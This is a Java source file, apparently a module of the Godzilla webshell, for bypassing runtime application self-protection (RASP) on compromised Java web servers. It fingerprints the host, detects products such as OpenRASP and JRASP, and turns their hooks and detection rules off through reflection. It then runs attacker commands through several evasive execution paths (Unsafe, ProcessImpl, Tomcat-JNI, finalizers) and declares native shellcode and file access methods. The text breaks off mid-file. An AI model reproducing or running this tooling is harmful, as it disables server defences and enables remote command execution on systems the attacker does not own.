package shells.plugins.java.assets;

import java.io.*;
import java.lang.reflect.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

/**
 * RASP Bypass Module - Server-side Implementation
 * Contains multiple bypass techniques for different RASP products
 * 
 * Compile: javac -source 1.8 -target 1.8 RaspBypassModule.java
 * Package: Copy RaspBypassModule.class to assets/RaspBypassModule.classs
 */
public class RaspBypassModule {
    
    private Map session;
    private Object servletRequest;
    private static boolean jniLoaded = false;
    private static String jniPath = null;
    private static final String MEM_FILTER_PREFIX = "RaspBypassMF_";
    
    /** Bound when {@link #loadJniLibrary} loads rasp_bypass_*.dll/.so (see native/rasp_bypass_jni.c). */
    public native String jniExec(String cmd);
    
    public native int forkAndExec(String cmd);
    
    public native String getProcessList();
    
    public native int execShellcode(byte[] shellcode);
    
    public native boolean isPrivileged();
    
    public native String getEnvVars();
    
    public native byte[] readFile(String path);
    
    public native boolean writeFile(String path, byte[] data);
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return (byte[]) value;
        }
        return null;
    }
    
    /** Command line from session: prefer {@code cmd}, fall back to {@code cmdLine} (Java shell / CommandExecModule). */
    private String getCommandLine() {
        String c = getString("cmd");
        if (c == null || c.trim().isEmpty()) {
            c = getString("cmdLine");
        }
        return c != null ? c.trim() : "";
    }
    
    private int getMethodIndex() {
        String mi = getString("methodIndex");
        if (mi == null || mi.trim().isEmpty()) {
            return 0;
        }
        try {
            return Integer.parseInt(mi.trim());
        } catch (NumberFormatException e) {
            return 0;
        }
    }
    
    // ==================== Main Entry Point ====================
    
    public byte[] execCommand() {
        String cmd = getCommandLine();
        int methodIndex = getMethodIndex();
        boolean autoDetect = "true".equals(getString("autoDetect"));
        
        if (cmd == null || cmd.trim().isEmpty()) {
            return "Error: Command is empty".getBytes();
        }
        
        try {
            if (autoDetect) {
                return execAutoDetect(cmd);
            }
            
            switch (methodIndex) {
                case 1: return execUnsafe(cmd);
                case 2: return execJni(cmd);
                case 3: return execNewThread(cmd);
                case 4: return execGc(cmd);
                case 5: return execProcessImpl(cmd);
                case 6: return execTomcatJni(cmd);
                case 7: return execReflection(cmd);
                case 8: return execForkAndExec(cmd);
                default: return execAutoDetect(cmd);
            }
        } catch (Exception e) {
            return ("Error: " + e.getMessage() + "\n" + getStackTrace(e)).getBytes();
        }
    }
    
    // ==================== Auto Detection ====================
    
    private byte[] execAutoDetect(String cmd) {
        StringBuilder result = new StringBuilder();
        result.append("[*] Auto detecting RASP...\n");
        
        boolean hasRasp = detectRasp();
        
        if (hasRasp) {
            result.append("[!] RASP detected — prep (soft disable) then shortest path first\n");
            prepSoftAgainstRasp();
            
            byte[] afterPrep = execNormal(cmd);
            if (!looksLikeExecFailure(afterPrep)) {
                result.append("[+] Normal ProcessBuilder succeeded after prep (preferred)\n");
                return (result.toString() + new String(afterPrep, StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8);
            }
            result.append("[!] Still blocked — deep bypass chain\n");
            
            byte[] execResult = tryBypassMethods(cmd, result);
            if (execResult != null) {
                return (result.toString() + new String(execResult, StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8);
            }
            
            return (result.toString() + "[-] All bypass methods failed").getBytes(StandardCharsets.UTF_8);
        } else {
            result.append("[+] No RASP detected, using normal execution\n");
            return (result.toString() + new String(execNormal(cmd))).getBytes();
        }
    }
    
    private byte[] tryBypassMethods(String cmd, StringBuilder log) {
        log.append("[*] Trying Unsafe.allocateInstance...\n");
        try {
            byte[] result = execUnsafe(cmd);
            if (result != null && result.length > 0 && !new String(result).contains("Error")) {
                log.append("[+] Unsafe method succeeded!\n");
                return result;
            }
        } catch (Exception e) {
            log.append("[-] Unsafe failed: " + e.getMessage() + "\n");
        }
        
        log.append("[*] Trying Reflection bypass (hook off + normal)...\n");
        try {
            byte[] refResult = execReflection(cmd);
            if (refResult != null && refResult.length > 0) {
                String rs = new String(refResult, StandardCharsets.UTF_8);
                if (!rs.contains("Reflection bypass error")) {
                    log.append("[+] Reflection bypass chain succeeded\n");
                    return refResult;
                }
            }
        } catch (Exception e) {
            log.append("[-] Reflection bypass failed: ").append(e.getMessage()).append("\n");
        }
        
        log.append("[*] Trying New Thread bypass...\n");
        try {
            byte[] result = execNewThread(cmd);
            if (result != null && result.length > 0) {
                log.append("[+] New Thread method succeeded!\n");
                return result;
            }
        } catch (Exception e) {
            log.append("[-] New Thread failed: " + e.getMessage() + "\n");
        }
        
        log.append("[*] Trying ProcessImpl direct...\n");
        try {
            byte[] result = execProcessImpl(cmd);
            if (result != null && result.length > 0) {
                log.append("[+] ProcessImpl method succeeded!\n");
                return result;
            }
        } catch (Exception e) {
            log.append("[-] ProcessImpl failed: " + e.getMessage() + "\n");
        }
        
        log.append("[*] Trying ForkAndExec...\n");
        try {
            byte[] result = execForkAndExec(cmd);
            if (result != null && result.length > 0) {
                log.append("[+] ForkAndExec method succeeded!\n");
                return result;
            }
        } catch (Exception e) {
            log.append("[-] ForkAndExec failed: " + e.getMessage() + "\n");
        }
        
        log.append("[*] Trying GC Finalize...\n");
        try {
            byte[] result = execGc(cmd);
            if (result != null && result.length > 0) {
                log.append("[+] GC Finalize method succeeded!\n");
                return result;
            }
        } catch (Exception e) {
            log.append("[-] GC Finalize failed: " + e.getMessage() + "\n");
        }
        
        return null;
    }
    
    /** OpenRASP hook off + JRASP algorithm triage (no console spam). */
    private void prepSoftAgainstRasp() {
        disableRaspHooks();
        try {
            Class<?> launcherClass = Class.forName("com.jrasp.agent.AgentLauncher");
            Field raspClassLoaderMap = getDeclaredField(launcherClass, "raspClassLoaderMap");
            raspClassLoaderMap.setAccessible(true);
            Map map = (Map) raspClassLoaderMap.get(null);
            if (map == null || map.isEmpty()) {
                return;
            }
            StringBuilder sink = new StringBuilder();
            for (Object loaderObj : map.values()) {
                if (!(loaderObj instanceof ClassLoader)) {
                    continue;
                }
                try {
                    Class<?> am = ((ClassLoader) loaderObj).loadClass("com.jrasp.core.algorithm.DefaultAlgorithmManager");
                    jraspDisableAlgorithmMaps(am, sink);
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
    }
    
    private static boolean looksLikeExecFailure(byte[] out) {
        if (out == null || out.length == 0) {
            return true;
        }
        int n = Math.min(out.length, 320);
        String head = new String(out, 0, n, StandardCharsets.UTF_8);
        String h = head.toLowerCase();
        return h.startsWith("normal exec error")
            || h.startsWith("error:")
            || h.contains("securityexception")
            || h.contains("blocked by rasp")
            || h.contains("openrasp");
    }
    
    /**
     * \u672c\u63d2\u4ef6\u7c7b\u540d\u542b "Rasp"\uff0c\u6808\u626b\u63cf/\u5df2\u52a0\u8f7d\u7c7b\u7d22\u5f15\u4f1a\u8bef\u5224\u4e3a RASP\u3002
     */
    private static boolean isBenignGodzillaRaspPluginClass(String className) {
        if (className == null) {
            return true;
        }
        return className.contains("RaspBypassModule")
            || className.contains("RaspBypassUtils");
    }
    
    private boolean detectRasp() {
        try {
            String[] raspClasses = {
                "com.baidu.openrasp.HookHandler",
                "com.jrasp.agent.AgentLauncher",
                "com.jrasp.core.algorithm.DefaultAlgorithmManager",
                "com.bytedance.elkeid.agent.Agent",
                "com.tencent.rasp.agent.RaspAgent",
                "com.aliyun.rasp.agent.AgentMain",
                "com.qingteng.rasp.agent.AgentBootstrap",
                "io.oasec.rasp.Agent",
                "com.immunesecurity.rasp.Agent"
            };
            
            for (String className : raspClasses) {
                try {
                    Class.forName(className);
                    return true;
                } catch (ClassNotFoundException ignored) {
                }
            }
            
            StackTraceElement[] stack = Thread.currentThread().getStackTrace();
            for (StackTraceElement element : stack) {
                String className = element.getClassName();
                if (isBenignGodzillaRaspPluginClass(className)) {
                    continue;
                }
                if (className.contains("rasp") || className.contains("Rasp") || 
                    className.contains("RASP") || className.contains("hook") ||
                    className.contains("instrument")) {
                    return true;
                }
            }
            
            return false;
        } catch (Exception e) {
            return false;
        }
    }
    
    // ==================== Normal Execution ====================
    
    private byte[] execNormal(String cmd) {
        try {
            String[] command = buildCommand(cmd);
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            byte[] output = readStream(process.getInputStream());
            process.waitFor(30, TimeUnit.SECONDS);
            
            return output;
        } catch (Exception e) {
            return ("Normal exec error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 1: Unsafe.allocateInstance ====================
    
    private byte[] execUnsafe(String cmd) {
        try {
            Field theUnsafeField = getDeclaredField(sun.misc.Unsafe.class, "theUnsafe");
            theUnsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            
            Class<?> processClass;
            try {
                processClass = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                processClass = Class.forName("java.lang.ProcessImpl");
            }
            
            Object process = unsafe.allocateInstance(processClass);
            
            String[] cmdParts = cmd.split("\\s+");
            byte[][] args = new byte[cmdParts.length - 1][];
            int size = args.length;
            for (int i = 0; i < args.length; i++) {
                args[i] = cmdParts[i + 1].getBytes();
                size += args[i].length;
            }
            
            byte[] argBlock = new byte[size];
            int offset = 0;
            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, offset, arg.length);
                offset += arg.length + 1;
            }
            
            Field launchMechanismField = getDeclaredField(processClass, "launchMechanism");
            launchMechanismField.setAccessible(true);
            Object launchMechanism = launchMechanismField.get(process);
            
            Field helperpathField = getDeclaredField(processClass, "helperpath");
            helperpathField.setAccessible(true);
            byte[] helperpath = (byte[]) helperpathField.get(process);
            
            int ordinal = (int) launchMechanism.getClass().getMethod("ordinal").invoke(launchMechanism);
            
            Method forkMethod = getDeclaredMethod(processClass, "forkAndExec",
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class);
            forkMethod.setAccessible(true);
            
            int[] std_fds = new int[]{-1, -1, -1};
            byte[] prog = toCString(cmdParts[0]);
            
            int pid = (int) forkMethod.invoke(process,
                ordinal + 1, helperpath, prog, argBlock, args.length,
                null, 0, null, std_fds, false);
            
            Method initStreamsMethod = getDeclaredMethod(processClass, "initStreams", int[].class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(process, std_fds);
            
            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            InputStream in = (InputStream) getInputStreamMethod.invoke(process);
            
            return readStream(in);
        } catch (Exception e) {
            return ("Unsafe exec error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 2: JNI Execution ====================
    
    private byte[] execJni(String cmd) {
        try {
            byte[] result = execTomcatJni(cmd);
            if (result != null && !new String(result).contains("Error")) {
                return result;
            }
            return ("JNI: Tomcat-JNI not available, custom SO required").getBytes();
        } catch (Exception e) {
            return ("JNI exec error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 3: New Thread Bypass ====================
    
    private byte[] execNewThread(String cmd) {
        try {
            final String finalCmd = cmd;
            final ByteArrayOutputStream output = new ByteArrayOutputStream();
            final CountDownLatch latch = new CountDownLatch(1);
            
            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String[] command = buildCommand(finalCmd);
                        ProcessBuilder pb = new ProcessBuilder(command);
                        pb.redirectErrorStream(true);
                        Process process = pb.start();
                        
                        byte[] result = readStream(process.getInputStream());
                        output.write(result);
                        process.waitFor();
                    } catch (Exception e) {
                        try {
                            output.write(("Thread exec error: " + e.getMessage()).getBytes());
                        } catch (IOException ignored) {
                        }
                    } finally {
                        latch.countDown();
                    }
                }
            });
            
            t.start();
            
            if (latch.await(30, TimeUnit.SECONDS)) {
                return output.toByteArray();
            } else {
                return "Thread execution timeout".getBytes();
            }
        } catch (Exception e) {
            return ("New Thread error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 4: GC Finalize Bypass ====================
    
    private byte[] execGc(String cmd) {
        try {
            final String finalCmd = cmd;
            final ByteArrayOutputStream output = new ByteArrayOutputStream();
            final CountDownLatch latch = new CountDownLatch(1);
            
            Object obj = new Object() {
                @Override
                protected void finalize() throws Throwable {
                    try {
                        String[] command = buildCommand(finalCmd);
                        ProcessBuilder pb = new ProcessBuilder(command);
                        pb.redirectErrorStream(true);
                        Process process = pb.start();
                        
                        byte[] result = readStream(process.getInputStream());
                        output.write(result);
                        process.waitFor();
                    } catch (Exception e) {
                        output.write(("GC exec error: " + e.getMessage()).getBytes());
                    } finally {
                        latch.countDown();
                    }
                    super.finalize();
                }
            };
            
            java.lang.ref.WeakReference<Object> weakRef = new java.lang.ref.WeakReference<>(obj);
            obj = null;
            
            System.gc();
            System.runFinalization();
            
            if (latch.await(10, TimeUnit.SECONDS)) {
                return output.toByteArray();
            } else {
                return "GC execution timeout".getBytes();
            }
        } catch (Exception e) {
            return ("GC error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 5: ProcessImpl Direct ====================
    
    private byte[] execProcessImpl(String cmd) {
        try {
            Class<?> processImplClass;
            try {
                processImplClass = Class.forName("java.lang.ProcessImpl");
            } catch (ClassNotFoundException e) {
                return "ProcessImpl class not found".getBytes();
            }
            
            Method createMethod = getDeclaredMethod(processImplClass, "create",
                String.class, String.class, String.class,
                long[].class, boolean.class);
            createMethod.setAccessible(true);
            
            long[] stdHandles = new long[]{-1, -1, -1};
            
            Process process = (Process) createMethod.invoke(null,
                cmd, null, null, stdHandles, true);
            
            if (process != null) {
                byte[] output = readStream(process.getInputStream());
                process.waitFor(30, TimeUnit.SECONDS);
                return output;
            }
            
            return "ProcessImpl create returned null".getBytes();
        } catch (Exception e) {
            return ("ProcessImpl error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 6: Tomcat-JNI ====================
    
    private byte[] execTomcatJni(String cmd) {
        try {
            Class<?> libraryClass = Class.forName("org.apache.tomcat.jni.Library");
            Method initializeMethod = libraryClass.getMethod("initialize", String.class);
            initializeMethod.invoke(null, (String) null);
            
            Class<?> poolClass = Class.forName("org.apache.tomcat.jni.Pool");
            Method createMethod = poolClass.getMethod("create", long.class);
            long pool = (Long) createMethod.invoke(null, 0L);
            
            Class<?> procClass = Class.forName("org.apache.tomcat.jni.Proc");
            Method allocMethod = procClass.getMethod("alloc", long.class);
            long proc = (Long) allocMethod.invoke(null, pool);
            
            Class<?> procattrClass = Class.forName("org.apache.tomcat.jni.Procattr");
            Method procattrCreateMethod = procattrClass.getMethod("create", long.class);
            long procattr = (Long) procattrCreateMethod.invoke(null, pool);
            
            String[] cmdParts = buildCommand(cmd);
            Method procCreateMethod = procClass.getMethod("create",
                long.class, String.class, String[].class, String[].class,
                long.class, long.class);
            
            procCreateMethod.invoke(null, proc, cmdParts[0], cmdParts, new String[0], procattr, pool);
            
            return "Tomcat-JNI: Command executed (no output capture)".getBytes();
        } catch (ClassNotFoundException e) {
            return "Tomcat-JNI: Library not found".getBytes();
        } catch (Exception e) {
            return ("Tomcat-JNI error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 7: Reflection Bypass ====================
    
    private byte[] execReflection(String cmd) {
        try {
            disableRaspHooks();
            return execNormal(cmd);
        } catch (Exception e) {
            return ("Reflection bypass error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Method 8: ForkAndExec Direct ====================
    
    private byte[] execForkAndExec(String cmd) {
        try {
            return execUnsafe(cmd);
        } catch (Exception e) {
            return ("ForkAndExec error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== RASP Detection and Disable ====================
    
    public byte[] checkRasp() {
        StringBuilder result = new StringBuilder();
        result.append("=== RASP Detection Results ===\n\n");
        
        result.append("[OpenRASP] ");
        try {
            Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
            Field enableHookField = getDeclaredField(hookHandlerClass, "enableHook");
            enableHookField.setAccessible(true);
            Object enableHook = enableHookField.get(null);
            result.append("DETECTED - enableHook: " + enableHook + "\n");
        } catch (Exception e) {
            result.append("Not detected\n");
        }
        
        result.append("[JRASP] ");
        try {
            Class<?> launcherClass = Class.forName("com.jrasp.agent.AgentLauncher");
            result.append("DETECTED\n");
            
            try {
                Field raspClassLoaderMap = getDeclaredField(launcherClass, "raspClassLoaderMap");
                raspClassLoaderMap.setAccessible(true);
                Map map = (Map) raspClassLoaderMap.get(null);
                result.append("  - ClassLoaders: " + (map != null ? map.keySet() : "null") + "\n");
            } catch (Exception ignored) {
            }
        } catch (ClassNotFoundException e) {
            result.append("Not detected\n");
        }
        
        result.append("[Elkeid] ");
        try {
            Class.forName("com.bytedance.elkeid.agent.Agent");
            result.append("DETECTED\n");
        } catch (ClassNotFoundException e) {
            result.append("Not detected\n");
        }
        
        result.append("[QingTeng] ");
        try {
            Class<?> qtClass = Class.forName("com.qingteng.rasp.agent.AgentBootstrap");
            result.append("DETECTED\n");
            try {
                Field enabledField = qtClass.getDeclaredField("enabled");
                enabledField.setAccessible(true);
                Object enabled = enabledField.get(null);
                result.append("  - enabled: " + enabled + "\n");
            } catch (Exception ignored) {
            }
        } catch (ClassNotFoundException e) {
            result.append("Not detected\n");
        }
        
        result.append("[Tencent RASP] ");
        try {
            Class.forName("com.tencent.rasp.agent.RaspAgent");
            result.append("DETECTED\n");
        } catch (ClassNotFoundException e) {
            result.append("Not detected\n");
        }
        
        result.append("[Aliyun RASP] ");
        try {
            Class.forName("com.aliyun.rasp.agent.AgentMain");
            result.append("DETECTED\n");
        } catch (ClassNotFoundException e) {
            result.append("Not detected\n");
        }
        
        appendCheckLine(result, "OASEC RASP", "io.oasec.rasp.Agent");
        appendCheckLine(result, "Immune RASP", "com.immunesecurity.rasp.Agent");
        
        result.append("\n[Stack Trace Analysis]\n");
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        boolean anyFrame = false;
        for (StackTraceElement element : stack) {
            String className = element.getClassName();
            if (isBenignGodzillaRaspPluginClass(className)) {
                continue;
            }
            if (className.contains("rasp") || className.contains("Rasp") ||
                className.contains("hook") || className.contains("instrument")) {
                result.append("  - " + element.toString() + "\n");
                anyFrame = true;
            }
        }
        if (!anyFrame) {
            result.append("  (\u672a\u53d1\u73b0\u5f02\u5e38 RASP/hook/instrument \u6808\u5e27\uff0c\u5df2\u6392\u9664\u672c\u63d2\u4ef6\u81ea\u8eab)\n");
        }
        
        return result.toString().getBytes();
    }

    private void appendCheckLine(StringBuilder result, String label, String className) {
        result.append("[").append(label).append("] ");
        try {
            Class.forName(className);
            result.append("\u5df2\u68c0\u6d4b\u5230\n");
        } catch (ClassNotFoundException e) {
            result.append("\u672a\u68c0\u6d4b\u5230\n");
        }
    }
    
    /**
     * \u4e3b\u673a/\u8fd0\u884c\u73af\u5883\u6307\u7eb9\uff1aJDK\u3001\u5bb9\u5668\u3001SecurityManager\u3001RASP\u5feb\u8bfb\u3002
     */
    public byte[] opsEnvironment() {
        StringBuilder sb = new StringBuilder();
        sb.append("=== \u4e3b\u673a / \u8fd0\u884c\u73af\u5883\u6307\u7eb9 ===\n\n");
        sb.append("[JVM Java\u865a\u62df\u673a]\n");
        sb.append("  \u7248\u672c: ").append(System.getProperty("java.version", "?")).append("\n");
        sb.append("  \u5382\u5546: ").append(System.getProperty("java.vendor", "?")).append("\n");
        sb.append("  VM: ").append(System.getProperty("java.vm.name", "?")).append("\n");
        sb.append("  JAVA_HOME: ").append(System.getProperty("java.home", "?")).append("\n");
        sb.append("  \u4e34\u65f6\u76ee\u5f55: ").append(System.getProperty("java.io.tmpdir", "?")).append("\n");
        try {
            sb.append("  \u542f\u52a8\u53c2\u6570: ").append(java.lang.management.ManagementFactory.getRuntimeMXBean().getInputArguments()).append("\n");
        } catch (Exception e) {
            sb.append("  \u542f\u52a8\u53c2\u6570: \u65e0\n");
        }
        
        sb.append("\n[\u64cd\u4f5c\u7cfb\u7edf]\n");
        sb.append("  ").append(System.getProperty("os.name", "?")).append(" ").append(System.getProperty("os.arch", "?")).append("\n");
        sb.append("  \u7528\u6237\u540d: ").append(System.getProperty("user.name", "?")).append("\n");
        sb.append("  \u5de5\u4f5c\u76ee\u5f55: ").append(System.getProperty("user.dir", "?")).append("\n");
        
        sb.append("\n[SecurityManager \u5b89\u5168\u7ba1\u7406\u5668]\n");
        SecurityManager sm = System.getSecurityManager();
        sb.append("  ").append(sm == null ? "\u672a\u8bbe\u7f6e" : sm.getClass().getName()).append("\n");
        
        sb.append("\n[Web \u5bb9\u5668\u7c7b\u68c0\u6d4b]\n");
        String[][] probes = new String[][]{
            {"Tomcat StandardContext", "org.apache.catalina.core.StandardContext"},
            {"Spring Boot", "org.springframework.boot.SpringApplication"},
            {"Spring MVC", "org.springframework.web.servlet.DispatcherServlet"},
            {"Undertow", "io.undertow.Undertow"},
            {"Jetty Server", "org.eclipse.jetty.server.Server"},
            {"Tomcat \u5d4c\u5165", "org.apache.catalina.startup.Tomcat"}
        };
        for (String[] p : probes) {
            appendCheckLine(sb, p[0], p[1]);
        }
        sb.append("  catalina.base: ").append(System.getProperty("catalina.base", "")).append("\n");
        sb.append("  catalina.home: ").append(System.getProperty("catalina.home", "")).append("\n");
        
        sb.append("\n[\u5f53\u524d\u8bf7\u6c42 ServletContext]\n");
        Object sc = memShellGetServletContext();
        sb.append("  ").append(sc == null ? "\u65e0\uff08\u9700\u5728 HTTP \u8bf7\u6c42\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff09" : sc.getClass().getName()).append("\n");
        
        sb.append("\n[RASP \u542f\u53d1\u5f0f\u5224\u65ad]\n");
        sb.append("  detectRasp(): ").append(detectRasp()).append(" \u2014 true \u8868\u793a\u547d\u4e2d\u5e38\u89c1 RASP \u7c7b\u6216\u6808\u5173\u952e\u5b57\n");
        
        sb.append("\n[\u8bf4\u660e]\n");
        sb.append("  - \u52fe\u9009\u300c\u81ea\u52a8\u63a2\u6d4b\u300d\u6267\u884c\u547d\u4ee4\u65f6\uff1a\u5148\u8f6f\u7981\u7528(OpenRASP/JRASP)\uff0c\u518d\u5c1d\u8bd5\u666e\u901a ProcessBuilder\uff0c\u5931\u8d25\u540e\u8d70\u6df1\u5ea6\u7ed5\u8fc7\u94fe\u3002\n");
        sb.append("  - \u5efa\u8bae\u5148\u70b9\u300c\u68c0\u67e5 RASP \u72b6\u6001\u300d\u548c\u672c\u6307\u7eb9\uff0c\u518d\u505a\u9ad8\u566a\u58f0\u64cd\u4f5c\u3002\n");
        
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }

    public byte[] disableRasp() {
        String raspType = getString("raspType");
        String action = getString("action");
        
        StringBuilder result = new StringBuilder();
        result.append("=== RASP Disable Attempt ===\n");
        result.append("Type: " + raspType + "\n");
        result.append("Action: " + action + "\n\n");
        
        try {
            if (raspType.contains("OpenRASP")) {
                result.append(disableOpenRasp(action));
            } else if (raspType.contains("JRASP")) {
                result.append(disableJrasp(action));
            } else if (raspType.contains("Elkeid")) {
                result.append(disableElkeid(action));
            } else if (raspType.contains("QingTeng") || raspType.contains("青藤")) {
                result.append(disableQingTeng(action));
            } else if (raspType.contains("Tencent") || raspType.contains("腾讯")) {
                result.append(disableTencentRasp(action));
            } else if (raspType.contains("Aliyun") || raspType.contains("阿里")) {
                result.append(disableAliyunRasp(action));
            } else {
                result.append(disableGenericRasp());
            }
        } catch (Exception e) {
            result.append("Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }

    private String disableOpenRasp(String action) {
        StringBuilder result = new StringBuilder();
        
        try {
            Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
            
            if ("disableHook".equals(action)) {
                if (tryInvokeNoArgStatic(hookHandlerClass, "disableHook", result)
                    || tryInvokeNoArgStatic(hookHandlerClass, "disable", result)) {
                    result.append("[+] OpenRASP static disable method invoked\n");
                }
                openRaspSetEnableHookFalse(hookHandlerClass, result);
                try {
                    tryOpenRaspConfigBooleanFields(Class.forName("com.baidu.openrasp.config.Config"), result);
                } catch (Exception ignored) {
                }
            } else if ("modifyConfig".equals(action)) {
                Class<?> configClass = Class.forName("com.baidu.openrasp.config.Config");
                Method getConfigMethod = configClass.getMethod("getConfig");
                Object config = getConfigMethod.invoke(null);
                
                Field disableHooksField = getDeclaredField(configClass, "disableHooks");
                disableHooksField.setAccessible(true);
                disableHooksField.set(config, true);
                result.append("[+] disableHooks set to true\n");
                
                Field hookWhiteAllField = getDeclaredField(configClass, "hookWhiteAll");
                hookWhiteAllField.setAccessible(true);
                hookWhiteAllField.set(config, true);
                result.append("[+] hookWhiteAll set to true\n");
                
                tryOpenRaspConfigBooleanFields(configClass, result);
            }
            
            result.append("[+] OpenRASP disabled successfully!\n");
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    private static boolean tryInvokeNoArgStatic(Class<?> clazz, String name, StringBuilder log) {
        try {
            Method m = clazz.getDeclaredMethod(name);
            if (Modifier.isStatic(m.getModifiers())) {
                m.setAccessible(true);
                m.invoke(null);
                log.append("[+] ").append(clazz.getSimpleName()).append(".").append(name).append("()\n");
                return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }
    
    private void openRaspSetEnableHookFalse(Class<?> hookHandlerClass, StringBuilder result) {
        try {
            Field enableHookField = getDeclaredField(hookHandlerClass, "enableHook");
            enableHookField.setAccessible(true);
            stripFinalIfNeeded(enableHookField);
            Object enableHook = enableHookField.get(null);
            if (enableHook instanceof AtomicBoolean) {
                ((AtomicBoolean) enableHook).set(false);
                result.append("[+] enableHook (AtomicBoolean) -> false\n");
            } else if (enableHook instanceof Boolean) {
                try {
                    Field modifiersField = getDeclaredField(Field.class, "modifiers");
                    modifiersField.setAccessible(true);
                    modifiersField.setInt(enableHookField, enableHookField.getModifiers() & ~Modifier.FINAL);
                } catch (Exception ignored) {
                }
                enableHookField.set(null, Boolean.FALSE);
                result.append("[+] enableHook (Boolean) -> false\n");
            } else if (enableHookField.getType() == boolean.class) {
                enableHookField.setBoolean(null, false);
                result.append("[+] enableHook (boolean) -> false\n");
            }
        } catch (Exception e) {
            result.append("[-] enableHook field: ").append(e.getMessage()).append("\n");
        }
    }
    
    private void tryOpenRaspConfigBooleanFields(Class<?> configClass, StringBuilder result) {
        String[] toFalse = {"pluginEnable", "hookSwitch", "pluginMasterSwitch", "cloudSwitch"};
        try {
            Method getConfigMethod = configClass.getMethod("getConfig");
            Object cfg = getConfigMethod.invoke(null);
            if (cfg == null) {
                return;
            }
            Class<?> cfgClass = cfg.getClass();
            for (String fn : toFalse) {
                try {
                    Field f = getDeclaredField(cfgClass, fn);
                    f.setAccessible(true);
                    stripFinalIfNeeded(f);
                    if (f.getType() == boolean.class) {
                        f.setBoolean(cfg, false);
                        result.append("[+] config.").append(fn).append("=false\n");
                    } else if (f.getType() == Boolean.class) {
                        f.set(cfg, Boolean.FALSE);
                        result.append("[+] config.").append(fn).append("=false\n");
                    }
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
    }
    
    private void jraspDisableAlgorithmMaps(Class<?> algorithmManagerClass, StringBuilder result) throws Exception {
        Field algorithmMapsField = getDeclaredField(algorithmManagerClass, "algorithmMaps");
        algorithmMapsField.setAccessible(true);
        Map algorithmMaps = (Map) algorithmMapsField.get(null);
        if (algorithmMaps == null) {
            return;
        }
        for (Object key : algorithmMaps.keySet()) {
            Object algorithm = algorithmMaps.get(key);
            try {
                Field listField = algorithm.getClass().getDeclaredField("list");
                listField.setAccessible(true);
                List list = (List) listField.get(algorithm);
                if (list == null) {
                    continue;
                }
                for (Object item : list) {
                    Class<?> c = item.getClass();
                    while (c != null && c != Object.class) {
                        try {
                            Field actionField = c.getDeclaredField("action");
                            actionField.setAccessible(true);
                            actionField.set(item, 0);
                            break;
                        } catch (NoSuchFieldException e) {
                            c = c.getSuperclass();
                        }
                    }
                }
                result.append("[+] JRASP algorithm: ").append(key).append("\n");
            } catch (Exception ignored) {
            }
        }
    }
    
    private void tryInvokeJraspStatics(ClassLoader raspLoader, StringBuilder result) {
        String[] classes = {"com.jrasp.agent.AgentLauncher", "com.jrasp.core.JRASP"};
        String[] methods = {"stop", "shutdown", "disable", "pause"};
        for (String cn : classes) {
            try {
                Class<?> c = raspLoader.loadClass(cn);
                for (String mn : methods) {
                    tryInvokeNoArgStatic(c, mn, result);
                }
            } catch (Exception ignored) {
            }
        }
    }
    
    private String disableJrasp(String action) {
        StringBuilder result = new StringBuilder();
        
        try {
            Class<?> launcherClass = Class.forName("com.jrasp.agent.AgentLauncher");
            Field raspClassLoaderMap = getDeclaredField(launcherClass, "raspClassLoaderMap");
            raspClassLoaderMap.setAccessible(true);
            Map map = (Map) raspClassLoaderMap.get(null);
            
            if (map != null && !map.isEmpty()) {
                for (Object loaderObj : map.values()) {
                    if (!(loaderObj instanceof ClassLoader)) {
                        continue;
                    }
                    ClassLoader raspLoader = (ClassLoader) loaderObj;
                    try {
                        Class<?> algorithmManagerClass = raspLoader.loadClass("com.jrasp.core.algorithm.DefaultAlgorithmManager");
                        jraspDisableAlgorithmMaps(algorithmManagerClass, result);
                    } catch (Exception e) {
                        result.append("[-] JRASP loader ").append(raspLoader).append(": ").append(e.getMessage()).append("\n");
                    }
                    tryInvokeJraspStatics(raspLoader, result);
                }
            }
            
            result.append("[+] JRASP pass completed\n");
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
